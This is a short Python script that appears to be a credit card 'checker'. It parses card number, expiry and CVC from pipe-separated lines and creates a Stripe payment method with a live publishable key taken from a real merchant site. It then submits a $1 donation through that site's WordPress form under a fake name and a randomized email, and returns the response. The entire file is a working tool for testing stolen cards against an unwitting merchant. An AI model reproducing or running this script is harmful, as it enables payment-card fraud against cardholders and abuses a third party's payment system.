import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff93cb2e34f%3B+stripe-js-v3%2Ff93cb2e34f%3B+card-element&referrer=https%3A%2F%2Fplatinumie.net&time_on_page=52749&client_attribution_metadata[client_session_id]=1c3e64be-c47c-4ee0-8cc4-26c3d17a1a93&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=2b5396f3-c60a-4760-92aa-453c892b7a00&key=pk_live_518MVTVAuNIofUrAYO7iUYiZ91pQzdQOM4kaTbHub1iMIcYPxjwZ73s1RUGdHuelJEx67MrzxQHImXEejxtKnhBRC002hFcBHOb'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'platinumie.net',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://platinumie.net',
	    'referer': 'https://platinumie.net/happy-kickers/happy-kickers-payment-portals/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1776043065926',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=2315&_fluentform_12_fluentformnonce=c9664ef17d&_wp_http_referer=%2Fhappy-kickers%2Fhappy-kickers-payment-portals%2F&numeric-field=1.00&names%5Bfirst_name%5D=John&names%5Blast_name%5D=Lan&email=yellhtetgaung2106{random2}%40gmail.com&input_text_1=Ella&description=&custom-payment-amount=1&custom-payment-amount_2=0.03505&payment_method=stripe&input_radio=May&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '12',
	}
	
	response = requests.post('https://platinumie.net/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
	
	return response.text
